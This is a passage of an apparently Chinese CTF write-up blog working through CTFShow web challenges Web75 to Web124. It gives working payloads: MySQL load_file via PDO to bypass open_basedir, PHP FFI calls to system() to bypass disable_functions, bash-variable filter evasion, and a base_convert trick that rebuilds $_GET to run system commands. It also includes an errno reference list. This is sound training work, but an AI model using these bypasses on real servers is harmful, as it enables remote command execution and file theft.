title="Web75"></a>Web75</h2><p>用上面的glob协议扫描flag在flag36.txt</p><p>这道题的payload不是很懂</p><p>利用sql语句绕过open_basedir和disable_function</p><p>mysql的连接参数可以通过前面几个题拿到 但我太菜不知道在哪里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,<br>&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)<br>&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-<br>&gt;getMessage();exit(0);&#125;exit(0);<br></code></pre></td></tr></table></figure><h2 id="Web76"><a href="#Web76" class="headerlink" title="Web76"></a>Web76</h2><p>老样子glob协议扫描</p><p>flag在flag36d.txt</p><p>还是sql语句绕</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">c<span class="hljs-operator">=</span>try &#123;$dbh <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<br><span class="hljs-string">&#x27;root&#x27;</span>);foreach($dbh<span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> $<span class="hljs-type">row</span>)<br>&#123;echo($<span class="hljs-type">row</span>[<span class="hljs-number">0</span>]).&quot;|&quot;; &#125;$dbh <span class="hljs-operator">=</span> <span class="hljs-keyword">null</span>;&#125;catch (PDOException $e) &#123;echo $e<span class="hljs-operator">-</span><br><span class="hljs-operator">&gt;</span>getMessage();exit(<span class="hljs-number">0</span>);&#125;exit(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h2><p>扫描根目录 这次有两个flag 文件一个flag36x.txt 一个readflag</p><p>flag在readflag下</p><p>这道题利用php7.4新特性FFI进行绕过</p><p><a href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a> </p><p><a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p><blockquote><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;/readflag &gt; 1.txt&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>执行完成后访问1.txt拿到flag</p><h2 id="Web118"><a href="#Web118" class="headerlink" title="Web118"></a>Web118</h2><p>这里给了一个提示 链接已经挂了</p><p>是一个图片</p><p><img src="/posts/999021e8/image-20220331104415460.png" alt="image-20220331104415460"></p><p>打开题目是一个输入框 查看源代码发现这个搜索框是执行<code>system($code);</code>code是我们传入的变量</p><p>这道题利用了linux的内置变量</p><p><a href="https://www.cnblogs.com/sparkdev/p/9934595.html">https://www.cnblogs.com/sparkdev/p/9934595.html</a></p><p><a href="https://blog.51cto.com/allenh/1695810">https://blog.51cto.com/allenh/1695810</a></p><blockquote><p>${PWD} 返回工作目录(你当前所在的目录)</p><p>可以使用切片取得返回的字母  例:${PWD:0:1}</p><p>同时可以利用取反号<del>取变量的后几位  例:${PWD:</del>0}</p><p>0也可以用字母代替 例:<code>$&#123;PWD:~A&#125;</code> 返回结果和 <code>$&#123;PWD:~0&#125;</code>相同</p><p>${PATH} 通常是bin</p><p>$IFS 内部域分隔符 默认为空白(空格, 制表符,和换行符)</p></blockquote><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PATH:~A&#125;<span class="hljs-variable">$&#123;PWD:~A&#125;</span><span class="hljs-variable">$IFS</span>????.???  <span class="hljs-comment">#nl flag.php</span></span><br></code></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web119-121"><a href="#Web119-121" class="headerlink" title="Web119-121"></a>Web119-121</h2><p>因为payload有{和#会导致博客BUG因此移至语雀<a href="https://www.yuque.com/fatty-dooyc/ihgw31/zuxzgr">CTFShow Web入门_命令执行 · 语雀 (yuque.com)</a></p><h2 id="Web122"><a href="#Web122" class="headerlink" title="Web122"></a>Web122</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="hljs-variable">$code</span>))&#123;    <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">65</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-string">&#x27;you are so long , I dont like &#x27;</span>.<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>过滤了PWD和#</p><blockquote><p>yu师傅说${}的报错在本地返回时1，但是题目的报错环境是2，所以放开了&lt;<br>&lt;A的报错返回也是1，所以就成功得到了数字1，至于数字4拿RANDOM随机就可以了。</p><p>由于需要$?返回值为1，所以在前面加一个&lt;A使其报错；</p></blockquote><p>$?非0的时候的返回值是可控的 如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs shell">&quot;OS error code   1:  Operation not permitted&quot;<br>&quot;OS error code   2:  No such file or directory&quot;<br>&quot;OS error code   3:  No such process&quot;<br>&quot;OS error code   4:  Interrupted system call&quot;<br>&quot;OS error code   5:  Input/output error&quot;<br>&quot;OS error code   6:  No such device or address&quot;<br>&quot;OS error code   7:  Argument list too long&quot;<br>&quot;OS error code   8:  Exec format error&quot;<br>&quot;OS error code   9:  Bad file descriptor&quot;<br>&quot;OS error code  10:  No child processes&quot;<br>&quot;OS error code  11:  Resource temporarily unavailable&quot;<br>&quot;OS error code  12:  Cannot allocate memory&quot;<br>&quot;OS error code  13:  Permission denied&quot;<br>&quot;OS error code  14:  Bad address&quot;<br>&quot;OS error code  15:  Block device required&quot;<br>&quot;OS error code  16:  Device or resource busy&quot;<br>&quot;OS error code  17:  File exists&quot;<br>&quot;OS error code  18:  Invalid cross-device link&quot;<br>&quot;OS error code  19:  No such device&quot;<br>&quot;OS error code  20:  Not a directory&quot;<br>&quot;OS error code  21:  Is a directory&quot;<br>&quot;OS error code  22:  Invalid argument&quot;<br>&quot;OS error code  23:  Too many open files in system&quot;<br>&quot;OS error code  24:  Too many open files&quot;<br>&quot;OS error code  25:  Inappropriate ioctl for device&quot;<br>&quot;OS error code  26:  Text file busy&quot;<br>&quot;OS error code  27:  File too large&quot;<br>&quot;OS error code  28:  No space left on device&quot;<br>&quot;OS error code  29:  Illegal seek&quot;<br>&quot;OS error code  30:  Read-only file system&quot;<br>&quot;OS error code  31:  Too many links&quot;<br>&quot;OS error code  32:  Broken pipe&quot;<br>&quot;OS error code  33:  Numerical argument out of domain&quot;<br>&quot;OS error code  34:  Numerical result out of range&quot;<br>&quot;OS error code  35:  Resource deadlock avoided&quot;<br>&quot;OS error code  36:  File name too long&quot;<br>&quot;OS error code  37:  No locks available&quot;<br>&quot;OS error code  38:  Function not implemented&quot;<br>&quot;OS error code  39:  Directory not empty&quot;<br>&quot;OS error code  40:  Too many levels of symbolic links&quot;<br>&quot;OS error code  42:  No message of desired type&quot;<br>&quot;OS error code  43:  Identifier removed&quot;<br>&quot;OS error code  44:  Channel number out of range&quot;<br>&quot;OS error code  45:  Level 2 not synchronized&quot;<br>&quot;OS error code  46:  Level 3 halted&quot;<br>&quot;OS error code  47:  Level 3 reset&quot;<br>&quot;OS error code  48:  Link number out of range&quot;<br>&quot;OS error code  49:  Protocol driver not attached&quot;<br>&quot;OS error code  50:  No CSI structure available&quot;<br>&quot;OS error code  51:  Level 2 halted&quot;<br>&quot;OS error code  52:  Invalid exchange&quot;<br>&quot;OS error code  53:  Invalid request descriptor&quot;<br>&quot;OS error code  54:  Exchange full&quot;<br>&quot;OS error code  55:  No anode&quot;<br>&quot;OS error code  56:  Invalid request code&quot;<br>&quot;OS error code  57:  Invalid slot&quot;<br>&quot;OS error code  59:  Bad font file format&quot;<br>&quot;OS error code  60:  Device not a stream&quot;<br>&quot;OS error code  61:  No data available&quot;<br>&quot;OS error code  62:  Timer expired&quot;<br>&quot;OS error code  63:  Out of streams resources&quot;<br>&quot;OS error code  64:  Machine is not on the network&quot;<br>&quot;OS error code  65:  Package not installed&quot;<br>&quot;OS error code  66:  Object is remote&quot;<br>&quot;OS error code  67:  Link has been severed&quot;<br>&quot;OS error code  68:  Advertise error&quot;<br>&quot;OS error code  69:  Srmount error&quot;<br>&quot;OS error code  70:  Communication error on send&quot;<br>&quot;OS error code  71:  Protocol error&quot;<br>&quot;OS error code  72:  Multihop attempted&quot;<br>&quot;OS error code  73:  RFS specific error&quot;<br>&quot;OS error code  74:  Bad message&quot;<br>&quot;OS error code  75:  Value too large for defined data type&quot;<br>&quot;OS error code  76:  Name not unique on network&quot;<br>&quot;OS error code  77:  File descriptor in bad state&quot;<br>&quot;OS error code  78:  Remote address changed&quot;<br>&quot;OS error code  79:  Can not access a needed shared library&quot;<br>&quot;OS error code  80:  Accessing a corrupted shared library&quot;<br>&quot;OS error code  81:  .lib section in a.out corrupted&quot;<br>&quot;OS error code  82:  Attempting to link in too many shared libraries&quot;<br>&quot;OS error code  83:  Cannot exec a shared library directly&quot;<br>&quot;OS error code  84:  Invalid or incomplete multibyte or wide character&quot;<br>&quot;OS error code  85:  Interrupted system call should be restarted&quot;<br>&quot;OS error code  86:  Streams pipe error&quot;<br>&quot;OS error code  87:  Too many users&quot;<br>&quot;OS error code  88:  Socket operation on non-socket&quot;<br>&quot;OS error code  89:  Destination address required&quot;<br>&quot;OS error code  90:  Message too long&quot;<br>&quot;OS error code  91:  Protocol wrong type for socket&quot;<br>&quot;OS error code  92:  Protocol not available&quot;<br>&quot;OS error code  93:  Protocol not supported&quot;<br>&quot;OS error code  94:  Socket type not supported&quot;<br>&quot;OS error code  95:  Operation not supported&quot;<br>&quot;OS error code  96:  Protocol family not supported&quot;<br>&quot;OS error code  97:  Address family not supported by protocol&quot;<br>&quot;OS error code  98:  Address already in use&quot;<br>&quot;OS error code  99:  Cannot assign requested address&quot;<br>&quot;OS error code 100:  Network is down&quot;<br>&quot;OS error code 101:  Network is unreachable&quot;<br>&quot;OS error code 102:  Network dropped connection on reset&quot;<br>&quot;OS error code 103:  Software caused connection abort&quot;<br>&quot;OS error code 104:  Connection reset by peer&quot;<br>&quot;OS error code 105:  No buffer space available&quot;<br>&quot;OS error code 106:  Transport endpoint is already connected&quot;<br>&quot;OS error code 107:  Transport endpoint is not connected&quot;<br>&quot;OS error code 108:  Cannot send after transport endpoint shutdown&quot;<br>&quot;OS error code 109:  Too many references: cannot splice&quot;<br>&quot;OS error code 110:  Connection timed out&quot;<br>&quot;OS error code 111:  Connection refused&quot;<br>&quot;OS error code 112:  Host is down&quot;<br>&quot;OS error code 113:  No route to host&quot;<br>&quot;OS error code 114:  Operation already in progress&quot;<br>&quot;OS error code 115:  Operation now in progress&quot;<br>&quot;OS error code 116:  Stale NFS file handle&quot;<br>&quot;OS error code 117:  Structure needs cleaning&quot;<br>&quot;OS error code 118:  Not a XENIX named type file&quot;<br>&quot;OS error code 119:  No XENIX semaphores available&quot;<br>&quot;OS error code 120:  Is a named type file&quot;<br>&quot;OS error code 121:  Remote I/O error&quot;<br>&quot;OS error code 122:  Disk quota exceeded&quot;<br>&quot;OS error code 123:  No medium found&quot;<br>&quot;OS error code 124:  Wrong medium type&quot;<br>&quot;OS error code 125:  Operation canceled&quot;<br>&quot;OS error code 126:  Required key not available&quot;<br>&quot;OS error code 127:  Key has expired&quot;<br>&quot;OS error code 128:  Key has been revoked&quot;<br>&quot;OS error code 129:  Key was rejected by service&quot;<br>&quot;OS error code 130:  Owner died&quot;<br>&quot;OS error code 131:  State not recoverable&quot;<br>&quot;MySQL error code 132: Old database file&quot;<br>&quot;MySQL error code 133: No record read before update&quot;<br>&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;<br>&quot;MySQL error code 135: No more room in record file&quot;<br>&quot;MySQL error code 136: No more room in index file&quot;<br>&quot;MySQL error code 137: No more records (read after end of file)&quot;<br>&quot;MySQL error code 138: Unsupported extension used for table&quot;<br>&quot;MySQL error code 139: Too big row&quot;<br>&quot;MySQL error code 140: Wrong create options&quot;<br>&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;<br>&quot;MySQL error code 142: Unknown character set used&quot;<br>&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;<br>&quot;MySQL error code 144: Table is crashed and last repair failed&quot;<br>&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;<br>&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;<br>&quot;MySQL error code 147: Lock table is full;  Restart program with a larger locktable&quot;<br>&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;<br>&quot;MySQL error code 149: Lock deadlock; Retry transaction&quot;<br>&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;<br>&quot;MySQL error code 151: Cannot add a child row&quot;<br>&quot;MySQL error code 152: Cannot delete a parent row&quot;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???<br></code></pre></td></tr></table></figure><p>试个几十次就会出来base64 解码拿到flag</p><h2 id="Web124"><a href="#Web124" class="headerlink" title="Web124"></a>Web124</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>不能有特殊字符，不能输入除whitelist内的其他字符</p><p>这里可以利用进制转换构造出字母的思路来绕过</p><blockquote><p>base_convert() 函数在任意进制之间转换数字</p><p>decbin() 函数把十进制转换为二进制</p><p>bindec() 把二进制转换为十进制</p><p>dechex() 把十进制转换为十六进制</p><p>decoct() 把十进制转换为八进制</p><p>hex2bin() 把十六进制值转换为 ASCII 字符</p></blockquote><p>利用动态函数调用的思路</p><p><code>$_GET[abs]($_GET[acos])</code> # 有一个80字符的长度限制 abs，acos是因为只能输入whitelist内的字符</p><p>↓</p><p><code>$_GET&#123;abs&#125;($_GET&#123;acos&#125;)</code> # []被过滤使用{}代替</p><p>↓</p><p>进制转换构造_GET # _GET 10进制:1598506324 16进制5f474554但无法传入字母<br><code>dechex(1598506324)</code> # 5f474554 → <code>hex2bin(dechex(1598506324))</code> # _GET</p><p>↓</p><p><code>base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))</code> # hex2bin无法传入用<code>base_convert(&#39;37907361743&#39;,10,36)</code>代替</p><p>↓</p><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&#x27;37907361743&#x27;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));<span class="hljs-variable">$$pi</span>&#123;abs&#125;(<span class="hljs-variable">$$pi</span>&#123;acos&#125;);&amp;abs=system&amp;acos=ls <span class="hljs-comment"># 查看目录</span><br>?c=<span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&#x27;37907361743&#x27;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));<span class="hljs-variable">$$pi</span>&#123;abs&#125;(<span class="hljs-variable">$$pi</span>&#123;acos&#125;);&amp;abs=system&amp;acos=cat flag.php <span class="hljs-comment"># 查看flag.php</span><br>  <br><span class="hljs-comment"># $pi 只能传入whitelist内字符</span><br><span class="hljs-comment"># $$pi $_GET</span><br><span class="hljs-comment"># $$pi&#123;abs&#125;($$pi&#123;acos&#125;); $_GET&#123;abs&#125;($_GET&#123;acos&#125;)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow Web入门_爆破</title>
    <link href="/posts/7ba9ac12/"/>
    <url>/posts/7ba9ac12/</url>
    
